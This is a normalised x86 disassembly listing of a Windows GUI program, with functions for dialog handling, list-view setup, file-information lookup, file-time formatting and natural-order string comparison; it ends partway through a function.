add esp 0x4
add eax esi
jmp r-xdata
cmp [ eax + 0x34 ] ecx
jb r-xdata
mov [ esp + 0x34 ] ebp
mov [ esp + 0x30 ] 0x0
push 0x1038
mov [ esp + 0x30 ] 0x2
push 0x100e
jmp r-xdata
mov eax [ ebx + rw-data ]
mov eax [ eax + ebp * 4 ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
push 0x0
push eax
mov eax [ rw-data ]
push 0x1014
push eax
call edi
cmp [ esp + 0x38 ] eax
jle r-xdata
push edx
call edi
mov ecx [ rw-data ]
lea eax [ esp + 0x38 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov eax [ esp + 0x30 ]
mov edx [ esp + 0x40 ]
cmp edx eax
mov eax [ esp + 0x28 ]
jl r-xdata
test ecx ecx
mov edx [ esp + 0x10 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
jge r-xdata
lea ecx [ ebp + 0x1 ]
mov ecx [ esp + 0x10 ]
mov edx [ rw-data ]
push 0x0
push ecx
push 0x1013
push edx
call edi
mov eax [ rw-data ]
push eax
call [ SetFocus@IAT ]
movzx edx [ esp + 0x10 ]
mov eax [ rw-data ]
movzx ecx bp
or ecx 0xffff8000
shl ecx 0x10
or ecx edx
push ecx
push 0xf9
push 0x111
push eax
call [ GetParent@IAT ]
push eax
call edi
mov eax [ rw-data ]
mov ecx esi
shr ecx 0x10
push ecx
movzx edx si
push edx
push 0xb1
push eax
call [ PostMessageA@IAT ]
mov al [ esp + 0x150 ]
test al al
lea ecx [ ebp - 0x1 ]
jne r-xdata
mov edx [ ebx + rw-data ]
test edx edx
jne r-xdata
mov ecx [ ebx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebx + rw-data ]
sub eax edx
sar eax 0x2
xor eax eax
jmp r-xdata
mov eax [ ebx + rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x138
retn
mov eax [ rw-data ]
inc eax
mov [ rw-data ] 0x0
mov [ rw-data ] eax
cmp ecx eax
jl r-xdata
lea ecx [ eax - 0x1 ]
dec edx
mov [ rw-data ] ecx
mov [ rw-data ] edx
sub_430760
mov eax [ esp + 0x8 ]
sub esp 0x40c
cmp eax 0x110
push esi
ja r-xdata
cmp eax 0x111
jne r-xdata
je r-xdata
xor eax eax
pop esi
add esp 0x40c
retn 0x10
movzx eax [ esp + 0x41c ]
dec eax
je r-xdata
mov edx [ esp + 0x414 ]
push 0x553
push 0x553
push 0x552
push edx
call [ CheckRadioButton@IAT ]
mov eax 0x1
pop esi
add esp 0x40c
retn 0x10
cmp eax 0x10
je r-xdata
mov esi [ esp + 0x414 ]
push ebx
mov ebx [ SendDlgItemMessageA@IAT ]
push edi
lea edx [ esp + 0x18 ]
push edx
push 0x3ff
push 0xd
push 0x554
push esi
call ebx
mov edi [ IsDlgButtonChecked@IAT ]
push 0x552
push esi
call edi
push 0x4f4
and al 0x1
push esi
mov [ esp + 0x18 ] al
call edi
push 0x4f3
and al 0x1
push esi
mov [ esp + 0x14 ] al
call edi
mov ecx [ esp + 0xc ]
mov edx [ esp + 0x10 ]
and al 0x1
mov [ esp + 0x14 ] al
mov eax [ esp + 0x14 ]
push 0x0
push eax
push ecx
push edx
lea eax [ esp + 0x28 ]
push eax
call sub_4303c0
add esp 0x14
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax [ esp + 0x414 ]
push 0x0
push eax
call [ ShowWindow@IAT ]
mov ecx [ rw-data ]
push ecx
call [ SetFocus@IAT ]
mov eax 0x1
pop esi
add esp 0x40c
retn 0x10
cmp eax 0x18
jne r-xdata
pop edi
pop ebx
mov eax 0x1
pop esi
add esp 0x40c
retn 0x10
lea ecx [ esp + 0x18 ]
push ecx
push 0xffffffff
push 0x14c
push 0x554
push esi
call ebx
cmp eax 0xffffffff
jne r-xdata
mov esi [ esp + 0x414 ]
push 0x554
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
push 0xffff0000
push 0x0
push 0x142
push 0x554
push esi
call [ SendDlgItemMessageA@IAT ]
call sub_430320
mov eax 0x1
pop esi
add esp 0x40c
retn 0x10
lea edx [ esp + 0x18 ]
push edx
push 0x0
push 0x143
push 0x554
push esi
call ebx
sub_430900
push ecx
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
xor ebp ebp
push edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x10 ] ebp
cmp [ esi ] 0x27
jne r-xdata
mov al [ edi + 0x1 ]
inc ebp
inc edi
cmp al 0x27
je r-xdata
mov dl [ edi ]
mov cl [ esi ]
mov al dl
test al al
je r-xdata
lea ebx [ ebx ]
mov [ esp + 0x10 ] ebp
test cl cl
jne r-xdata
test cl cl
je r-xdata
mov al [ esi + 0x1 ]
dec ebp
inc esi
cmp al 0x27
je r-xdata
mov [ esp + 0x10 ] ebp
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
pop ecx
retn
pop edi
pop esi
mov eax ebp
pop ebp
pop ebx
pop ecx
retn
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
mov bl al
sub bl 0x41
cmp bl 0x19
ja r-xdata
mov bl cl
sub bl 0x41
cmp bl 0x19
ja r-xdata
add al 0x20
mov bl al
sub bl 0x30
cmp bl 0xa
jae r-xdata
add cl 0x20
cmp al cl
jne r-xdata
mov bl cl
sub bl 0x30
cmp bl 0xa
jae r-xdata
xor al 0x20
add al 0x5f
mov dl 0x3b
cmp dl al
sbb ebx ebx
xor cl 0x20
add cl 0x5f
add ebx 0x2
mov al dl
cmp al cl
sbb ebp ebp
add ebp 0x2
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
xor ebp ebp
cmp dl 0x30
jne r-xdata
cmp eax 0x3
je r-xdata
inc edi
inc esi
jmp r-xdata
mov al [ edi + 0x1 ]
cmp al [ esi + 0x1 ]
jne r-xdata
cmp [ esi ] 0x30
jne r-xdata
nop
add edi ebx
add esi ebp
mov ebp [ esp + 0x10 ]
jmp r-xdata
cmp [ edi ] 0x27
jne r-xdata
mov ebx 0x2
mov ebp ebx
jmp r-xdata
add edi 0x2
add esi 0x2
jmp r-xdata
mov al [ edi ]
xor ecx ecx
nop
mov cl [ esi + 0x1 ]
sub cl 0x30
cmp cl 0xa
jae r-xdata
mov al [ edi + 0x1 ]
dec ebp
inc edi
cmp al 0x30
je r-xdata
push ebp
push esi
push ebx
push edi
push 0x1
push 0x800
call [ CompareStringA@IAT ]
cmp eax 0x1
je r-xdata
mov al [ edi + 0x1 ]
inc edi
mov dl al
sub dl 0x30
inc esi
cmp dl 0xa
jae r-xdata
movsx edx [ esi ]
movsx ecx al
sub ecx edx
mov al [ esi + 0x1 ]
inc ebp
inc esi
cmp al 0x30
je r-xdata
mov al [ edi + 0x1 ]
sub al 0x30
cmp al 0xa
jae r-xdata
mov al [ esi ]
sub al 0x30
cmp al 0xa
jb r-xdata
mov dl [ esi ]
sub dl 0x30
cmp dl 0xa
jb r-xdata
mov dl [ edi ]
sub dl 0x30
cmp dl 0xa
jb r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setge al
pop edi
pop esi
pop ebp
pop ebx
lea eax [ eax + eax - 0x1 ]
pop ecx
retn
test ebp ebp
jl r-xdata
jg r-xdata
mov ebp [ esp + 0x10 ]
jmp r-xdata
sub_430ad0
mov ecx [ esp + 0x4 ]
sub esp 0x410
push esi
push edi
mov edi [ MultiByteToWideChar@IAT ]
push 0x104
lea eax [ esp + 0xc ]
push eax
push 0xffffffff
push ecx
push 0x1
push 0x0
call edi
push 0x104
lea edx [ esp + 0x214 ]
push edx
push 0xffffffff
mov esi eax
mov eax [ esp + 0x42c ]
push eax
push 0x1
push 0x0
call edi
xor eax eax
test esi esi
jle r-xdata
pop edi
xor eax eax
pop esi
add esp 0x410
retn
lea ebx [ ebx ]
lea edx [ esp + eax * 2 + 0x8 ]
xor ecx ecx
mov cx [ edx ]
cmp cx 0x41
jb r-xdata
inc eax
cmp eax esi
jl r-xdata
lea ecx [ esp + eax * 2 + 0x210 ]
xor eax eax
mov ax [ ecx ]
cmp ax 0x41
jb r-xdata
cmp cx 0x5a
ja r-xdata
mov cx [ esp + eax * 2 + 0x8 ]
cmp cx [ esp + eax * 2 + 0x210 ]
jne r-xdata
mov dx [ edx ]
cmp dx [ ecx ]
pop edi
sbb eax eax
and eax 0xfffffffe
inc eax
pop esi
add esp 0x410
retn
cmp ax 0x5a
ja r-xdata
add ecx 0x20
mov [ edx ] cx
add eax 0x20
mov [ ecx ] ax
sub_430b90
sub esp 0x160
push esi
push edi
mov edi [ SHGetFileInfoA@IAT ]
push 0x4001
push 0x160
lea eax [ esp + 0x10 ]
push eax
push 0x0
push r--data
call edi
push 0x4000
push 0x160
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push r--data
mov esi eax
call edi
test esi esi
mov edi eax
je r-xdata
pop edi
xor eax eax
pop esi
add esp 0x160
retn
test edi edi
je r-xdata
push esi
mov esi [ SendMessageA@IAT ]
push 0x1
push 0x1003
push ebx
call esi
push edi
push 0x0
push 0x1003
push ebx
call esi
pop edi
mov eax 0x1
pop esi
add esp 0x160
retn
sub_430c20
push ecx
lea eax [ esp ]
push eax
call [ SHGetMalloc@IAT ]
test eax eax
jge r-xdata
test esi esi
je r-xdata
xor eax eax
pop ecx
retn
mov eax [ esp ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax 0x1
pop ecx
retn
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esi ] 0x0
mov [ esi + 0x8 ] 0x0
mov ecx [ esp ]
mov edx [ ecx ]
push eax
push ecx
call [ edx + 0x14 ]
mov [ esi + 0x4 ] 0x0
sub_430ca0
sub esp 0x20
push ebx
push ebp
push esi
mov esi [ esp + 0x30 ]
mov eax [ esi ]
mov ebx [ esi + 0x4 ]
push edi
mov edi [ esi + 0x8 ]
xor ebp ebp
push ebp
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
mov ecx [ esi ]
mov edx [ esi + 0x10 ]
push eax
mov eax [ esi + 0xc ]
push 0x64
push ecx
mov ecx [ esi + 0x14 ]
sub edx edi
push edx
mov edx [ esi + 0x18 ]
sub eax ebx
push eax
push edi
push ebx
push ecx
push r--data
push r--data
push edx
call [ CreateWindowExA@IAT ]
mov ebx eax
cmp ebx ebp
jne r-xdata
mov edi [ SendMessageA@IAT ]
push ebp
push ebp
push 0x1037
push ebx
call edi
or eax 0x20
push eax
push ebp
push 0x1036
push ebx
call edi
mov eax [ esi + 0x1c ]
lea ecx [ esp + 0x10 ]
push ecx
push ebp
push 0x101b
push ebx
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] r--data
mov [ esp + 0x34 ] ebp
call edi
mov edx [ esi + 0x20 ]
mov eax 0x1
lea ecx [ esp + 0x10 ]
push ecx
push eax
push 0x101b
push ebx
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] r--data
mov [ esp + 0x34 ] eax
call edi
mov edx [ esi + 0x24 ]
lea eax [ esp + 0x10 ]
push eax
push 0x2
push 0x101b
push ebx
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] edx
mov [ esp + 0x2c ] r--data
mov [ esp + 0x34 ] 0x2
call edi
mov ecx [ esi + 0x28 ]
lea edx [ esp + 0x10 ]
push edx
push 0x3
push 0x101b
push ebx
mov [ esp + 0x24 ] ebp
mov [ esp + 0x28 ] ecx
mov [ esp + 0x2c ] r--data
mov [ esp + 0x34 ] 0x3
call edi
mov eax [ esp + 0x38 ]
call sub_430c10
call sub_430b90
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
add esp 0x20
retn
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x20
retn
sub_430de0
mov ecx [ esp + 0x4 ]
sub esp 0x18
lea eax [ esp ]
push eax
push ecx
call [ FileTimeToLocalFileTime@IAT ]
lea edx [ esp + 0x8 ]
push edx
lea eax [ esp + 0x4 ]
push eax
call [ FileTimeToSystemTime@IAT ]
movzx ecx [ esp + 0x12 ]
movzx edx [ esp + 0x10 ]
movzx eax [ esp + 0xe ]
push ecx
movzx ecx [ esp + 0xe ]
push edx
movzx edx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x2c ]
push ecx
push edx
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0x34
retn
sub_430e40
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp + 0xc ]
add eax 0x3ff
shr eax 0xa
shl ecx 0x6
add eax ecx
push eax
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
retn
sub_430e70
sub esp 0x104
push ebx
mov ebx [ esp + 0x10c ]
push esi
mov esi [ esp + 0x11c ]
push edi
mov edi [ esp + 0x118 ]
push 0x140
push esi
push 0x1
push edi
push ebx
call [ SHGetDataFromIDListA@IAT ]
test eax eax
jl r-xdata
mov eax [ esp + 0x11c ]
and eax 0x40000177
cmp eax 0x40000177
jne r-xdata
cmp eax 0x80004002
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x104
retn
lea ecx [ esp + 0xc ]
push ecx
push 0x8000
push edi
push ebx
call sub_4443d0
add esp 0x10
push esi
lea edx [ esp + 0x10 ]
push edx
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x104
retn
push eax
call [ FindClose@IAT ]
sub_430f10
sub esp 0x160
push ebx
mov ebx [ SHGetFileInfoA@IAT ]
push 0x4011
push 0x160
lea eax [ esp + 0xc ]
push eax
push esi
push edi
call ebx
push 0x4013
push 0x160
lea ecx [ esp + 0xc ]
push ecx
push esi
push edi
call ebx
mov eax [ esp + 0x8 ]
pop ebx
add esp 0x160
retn
sub_430f50
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0xc ]
sub esp 0x160
test eax eax
je r-xdata
test [ ecx + 0x8 ] 0x40000000
je r-xdata
cmp [ eax + 0x18 ] 0x10
jb r-xdata
push r--data
mov edx [ esp + 0x168 ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx ]
push edx
mov edx [ ecx + 0x4 ]
push eax
push edx
call sub_444490
add esp 0xc
add esp 0x160
retn
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ esp + 0x16c ]
push eax
call [ lstrcpyA@IAT ]
mov eax 0x1
add esp 0x160
retn
mov ecx [ ecx + 0x8 ]
push 0x410
push 0x160
lea edx [ esp + 0x8 ]
push edx
push ecx
push eax
call [ SHGetFileInfoA@IAT ]
lea edx [ esp + 0x110 ]
push edx
jmp r-xdata
sub_430fe0
sub esp 0x488
push ebp
mov ebp [ esp + 0x490 ]
test ebp ebp
jne r-xdata
push edi
mov edi [ esp + 0x498 ]
test edi edi
jne r-xdata
or eax 0xffffffff
pop ebp
add esp 0x488
retn 0xc
mov edx [ esp + 0x49c ]
cmp edx 0x3e7
jne r-xdata
pop edi
mov eax 0x1
pop ebp
add esp 0x488
retn 0xc
mov ecx [ ebp + 0x8 ]
push ebx
push esi
xor esi esi
test ecx 0x20000000
je r-xdata
pop edi
or eax 0xffffffff
pop ebp
add esp 0x488
retn 0xc
test ecx 0x4000000
je r-xdata
mov esi 0xfffffff6
mov eax ecx
and eax 0x77
cmp eax 0x44
je r-xdata
sub esi 0x5
sub esi 0x14
cmp eax 0x77
je r-xdata
test eax 0x4000000
je r-xdata
add esi 0xa
mov eax [ edi + 0x8 ]
test eax 0x20000000
je r-xdata
sub esi 0x1e
jmp r-xdata
and eax 0x77
cmp eax 0x44
je r-xdata
add esi 0x5
add esi 0x14
cmp eax 0x77
je r-xdata
mov eax esi
pop esi
pop ebx
pop edi
pop ebp
add esp 0x488
retn 0xc
mov eax edx
and eax 0xffff7fff
cmp eax 0x3
ja r-xdata
test esi esi
mov eax [ ebp ]
mov ebx [ eax ]
jne r-xdata
add esi 0x1e
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp [ eax * 4 + jump_table_431320 ]
mov eax [ ebp + 0x4 ]
test eax eax
mov ebx 0x10
je r-xdata
mov ecx [ ebp + 0x4 ]
test ecx ecx
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
lea ecx [ esp + 0x254 ]
push ecx
push ebp
call sub_430f50
lea edx [ esp + 0x18 ]
push edx
push edi
call sub_430f50
add esp 0x10
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x258 ]
push ecx
call [ lstrcmpA@IAT ]
jmp r-xdata
mov eax [ ebp + 0x4 ]
lea edx [ esp + 0x114 ]
push edx
push ecx
push eax
push ebx
call sub_430e70
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp ]
lea ecx [ esp + 0x254 ]
push ecx
push 0x0
push eax
mov eax [ edx ]
push eax
call sub_4443d0
add esp 0x10
lea esi [ esp + 0x254 ]
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x4 ]
lea edx [ esp + 0x114 ]
push edx
push ecx
push eax
push ebx
call sub_430e70
add esp 0x10
test eax eax
je r-xdata
mov edi [ eax + 0x24 ]
mov ecx [ eax + 0x20 ]
shl edi 0x10
add edi ecx
jmp r-xdata
mov esi eax
test esi esi
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ edi + 0x4 ]
lea ecx [ esp + 0x358 ]
push ecx
push edx
push eax
push ebx
call sub_430e70
add esp 0x10
test eax eax
je r-xdata
mov esi r--data
cmp [ eax + 0x18 ] ebx
jb r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx [ ebx ]
push eax
push ecx
push 0x0
push ebx
call [ edx + 0x1c ]
test eax eax
jl r-xdata
mov edi [ esp + 0x130 ]
mov eax [ esp + 0x134 ]
shl edi 0x10
add edi eax
mov eax [ esp + 0x4a0 ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x4a4 ]
test ah ah
jns r-xdata
jmp r-xdata
lea ecx [ esp + 0x128 ]
push ecx
lea edx [ esp + 0x370 ]
push edx
call [ CompareFileTime@IAT ]
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
mov edx [ edi ]
lea ecx [ esp + 0x10 ]
push ecx
push 0x0
push eax
mov eax [ edx ]
push eax
call sub_4443d0
add esp 0x10
lea eax [ esp + 0x10 ]
jmp r-xdata
lea esi [ eax + 0x4 ]
jmp r-xdata
mov esi [ eax + 0x4 ]
jmp r-xdata
movsx esi ax
jmp r-xdata
mov edx [ eax + 0x8 ]
mov eax [ eax + 0x4 ]
lea ecx [ esp + 0x358 ]
push ecx
push edx
push eax
push ebx
call sub_430e70
add esp 0x10
test eax eax
je r-xdata
mov eax [ ecx + 0x24 ]
mov edx [ ecx + 0x20 ]
shl eax 0x10
add eax edx
jmp r-xdata
neg esi
mov eax r--data
cmp [ eax + 0x18 ] ebx
jb r-xdata
cmp [ rw-data ] 0x2
push eax
push esi
jne r-xdata
mov edi [ esp + 0x4a0 ]
mov eax [ esp + 0x374 ]
mov ecx [ esp + 0x378 ]
shl eax 0x10
add eax ecx
cmp edi eax
jge r-xdata
call sub_430900
xor edx edx
add esp 0x8
test eax eax
setge dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
call sub_430ad0
xor ecx ecx
add esp 0x8
test eax eax
setge cl
lea ecx [ ecx + ecx - 0x1 ]
mov esi ecx
jmp r-xdata
add eax 0x4
jmp r-xdata
mov eax [ eax + 0x4 ]
jmp r-xdata
jle r-xdata
or esi 0xffffffff
jmp r-xdata
xor esi esi
mov esi 0x1
jmp r-xdata
sub_431360
push 0xffffffff
push sub_4bff68
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_4313e0
push ebx
mov ebx [ esp + 0x8 ]
push ebp
push esi
mov esi ecx
mov edx [ esi + 0x8 ]
mov eax 0xfffffff
sub eax edx
cmp eax ebx
push edi
jae r-xdata
mov ecx [ esi + 0x8 ]
mov eax ecx
shr eax 0x1
cmp eax 0x8
jae r-xdata
call sub_431360
cmp ebx eax
jae r-xdata
mov eax 0x8
mov edi [ esi + 0xc ]
lea eax [ ecx + ebx ]
shl eax 0x2
push eax
shr edi 0x2
call sub_4b573e
mov edx [ esp + 0x18 ]
mov ecx [ esi + 0x8 ]
push edx
mov ebp eax
mov eax [ esi + 0x4 ]
push esi
lea edx [ ebp + edi * 4 ]
lea ecx [ eax + ecx * 4 ]
push edx
lea eax [ eax + edi * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esi + 0x4 ]
add esp 0x18
cmp edi ebx
ja r-xdata
mov edx 0xfffffff
sub edx eax
cmp ecx edx
ja r-xdata
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + ebx * 4 ]
push eax
push ecx
call sub_453050
mov eax [ esi + 0x4 ]
mov [ esp + 0x28 ] 0x0
mov edx [ esp + 0x28 ]
push edx
push esi
lea ecx [ eax + edi * 4 ]
push ebp
lea eax [ eax + ebx * 4 ]
push ecx
push eax
call sub_453050
mov ecx [ esp + 0x3c ]
push ecx
push esi
lea edx [ esp + 0x44 ]
push edx
push ebx
push eax
mov [ esp + 0x14 ] 0x0
mov edx [ esp + 0x14 ]
push edx
push esi
push eax
lea eax [ ecx + edi * 4 ]
push eax
push ecx
call sub_453050
mov ecx [ esp + 0x28 ]
push ecx
push esi
lea edx [ esp + 0x30 ]
push edx
mov ecx ebx
sub ecx edi
push ecx
push eax
call sub_420d80
mov [ esp + 0x3c ] 0x0
mov edx [ esp + 0x3c ]
push edx
push esi
lea eax [ esp + 0x44 ]
push eax
push edi
push ebp
jmp r-xdata
mov ebx eax
call sub_420d80
mov eax [ esi + 0x4 ]
add esp 0x3c
push eax
call j_sub_4b66ed#2
mov eax [ esi + 0x8 ]
add esp 0x4
add eax ebx
pop edi
mov [ esi + 0x4 ] ebp
mov [ esi + 0x8 ] eax
pop esi
pop ebp
pop ebx
retn 0x4
sub_431510
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
add ecx eax
test cl 0x3
jne r-xdata
mov eax [ esi + 0x8 ]
push ebx
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
add edi ebx
mov ebx edi
shr ebx 0x2
cmp eax ebx
ja r-xdata
mov ecx [ esi + 0x8 ]
add eax 0x4
shr eax 0x2
cmp ecx eax
ja r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub ebx eax
push 0x1
mov ecx esi
call sub_4313e0
mov edx [ esi + 0x4 ]
mov eax [ edx + ebx * 4 ]
and edi 0x3
lea eax [ eax + edi * 4 ]
test eax eax
pop edi
pop ebx
je r-xdata
push 0x10
call sub_4b573e
mov ecx [ esi + 0x4 ]
add esp 0x4
mov [ ecx + ebx * 4 ] eax
inc [ esi + 0x10 ]
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_431590
push 0xffffffff
push sub_4bff96
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x158
mov eax [ esp + 0x170 ]
push ebx
push ebp
push esi
xor ebx ebx
push edi
xor edi edi
cmp eax ebx
mov [ esp + 0x14 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x38 ] 0x7
je r-xdata
mov [ rw-data ] 0x0
cmp [ eax ] bx
je r-xdata
xor eax eax
jmp r-xdata
mov ebp [ esp + 0x178 ]
push ebx
push ebx
push 0x1009
push ebp
call [ SendMessageA@IAT ]
mov esi [ esp + 0x17c ]
call sub_430c20
test eax eax
jne r-xdata
push rw-data
push eax
call [ SHGetPathFromIDListA@IAT ]
jmp r-xdata
mov ecx [ esp + 0x168 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0x164
retn
push ebp
call sub_432380
add esp 0x4
mov esi eax
push esi
call [ SetCapture@IAT ]
push 0x7f02
push ebx
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov eax [ esp + 0x188 ]
cmp eax ebx
mov ebp [ esp + 0x184 ]
mov ecx 0x1
mov [ esp + 0x24 ] ecx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
call [ SHGetMalloc@IAT ]
cmp eax ebx
jl r-xdata
cmp ebp ebx
je r-xdata
cmp ebp ebx
je r-xdata
mov ebp [ esp + 0x180 ]
cmp ebp ebx
je r-xdata
mov ecx [ esp + 0x17c ]
mov [ ecx ] ebp
mov edx [ ebp ]
push ebp
call [ edx + 0x4 ]
mov eax [ esp + 0x180 ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
call sub_444320
mov edx [ esp + 0x184 ]
add esp 0x8
lea ecx [ esp + 0x1c ]
push ecx
push 0xe0
push esi
mov [ edx + 0x4 ] eax
mov eax [ ebp ]
push ebp
call [ eax + 0x10 ]
test eax eax
jl r-xdata
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
cmp [ eax + 0x18 ] 0x10
mov [ esp + 0x170 ] ebx
jb r-xdata
cmp [ eax + 0x40 ] ecx
jne r-xdata
mov al [ rw-data ]
test al al
mov [ esp + 0x24 ] ebx
jne r-xdata
cmp [ ebp ] bx
je r-xdata
mov eax [ esp + 0x1c ]
mov edx [ eax ]
lea ecx [ esp + 0x60 ]
push ecx
lea ecx [ esp + 0x18 ]
push ecx
push 0x1
push eax
call [ edx + 0xc ]
test eax eax
jne r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax [ esp + 0x17c ]
mov ecx [ eax + 0xc ]
mov edx [ esp + 0x178 ]
push ecx
push eax
push edx
call sub_431330
add esp 0xc
call [ ReleaseCapture@IAT ]
push 0x7f00
push ebx
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
mov eax [ esp + 0x14 ]
cmp eax ebx
je r-xdata
cmp ebp ebx
jne r-xdata
mov [ esp + 0x3c ] edi
mov esi 0x10
mov edi r--data
mov [ esp + 0x40 ] ebx
mov [ esp + 0x4c ] r--data
mov [ esp + 0x50 ] 0x104
call sub_430f10
mov ecx [ esp + 0x178 ]
mov [ esp + 0x54 ] eax
lea eax [ esp + 0x38 ]
push eax
push ebx
push 0x1007
push ecx
mov [ esp + 0x68 ] ebx
call [ SendMessageA@IAT ]
jmp r-xdata
lea ecx [ esp + 0x64 ]
call sub_401a00
lea ecx [ esp + 0x28 ]
mov [ esp + 0x170 ] 0xffffffff
call sub_403b20
jmp r-xdata
xor ebp ebp
jmp r-xdata
mov ecx [ esp + 0x178 ]
push ecx
lea edx [ esp + 0x2c ]
push edx
push eax
lea ecx [ esp + 0x70 ]
call sub_403030
lea eax [ esp + 0x64 ]
push eax
mov [ esp + 0x174 ] 0x1
mov [ esp + 0x8c ] 0x2
call sub_4090d0
add esp 0x4
cmp eax ebx
jl r-xdata
mov eax [ esp + 0x1c ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x10 ]
mov edx [ ecx ]
push eax
push ecx
call [ edx + 0x14 ]
mov edx [ esp + 0x10 ]
push ebp
push edx
call sub_444320
add esp 0x8
mov [ esp + 0x18 ] eax
mov [ esp + 0x18 ] ebx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx [ eax ]
push 0x10
push eax
call [ edx + 0xc ]
mov esi eax
cmp esi ebx
je r-xdata
mov eax [ esp + 0x2c ]
cmp eax ebx
je r-xdata
mov eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov ebx [ rw-data ]
mov edi rw-data
lea ebp [ ebx + eax ]
mov [ esp + 0x2c ] edi
lea eax [ esp + 0x18 ]
push eax
mov ecx rw-data
call sub_431510
mov eax [ rw-data ]
mov ecx rw-data
mov [ rw-data ] ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax ebx
jne r-xdata
mov eax [ esp + 0x17c ]
mov [ esp + 0x20 ] 0x60038177
mov [ esi ] eax
mov ecx [ ebp ]
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0x18 ]
push eax
push 0x1
push ebp
call [ ecx + 0x24 ]
mov ecx [ esp + 0x20 ]
mov [ esi + 0x8 ] ecx
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push edx
push eax
call sub_4442e0
lea ecx [ esp + 0x6c ]
push ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0xc ] ebx
mov edx [ esp + 0x20 ]
push ebx
push edx
push ebp
call sub_4443d0
add esp 0x18
test eax eax
je r-xdata
mov ecx [ esp + 0x30 ]
sub ecx eax
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
